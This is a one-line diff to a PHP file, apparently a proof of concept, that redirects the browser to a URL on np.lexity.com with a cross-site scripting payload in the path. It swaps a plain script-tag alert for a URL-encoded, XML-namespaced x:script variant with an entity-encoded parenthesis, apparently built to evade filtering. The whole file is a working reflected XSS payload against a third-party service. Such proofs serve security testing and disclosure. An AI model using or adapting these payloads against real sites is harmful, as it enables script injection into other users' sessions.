@@ -1,1 +1,1 @@
-<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/<script>alert(0)<%2fscript>') ?> 
+<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/%3C%3Fxml%20version=%221.0%22%3F%3E%3Cx:script%20xmlns:x=%22http:%2f%2fwww.w3.org%2f1999%2fxhtml%22%3Ealert(1%26%23x29;%3C%2fx:script%3E') ?> 
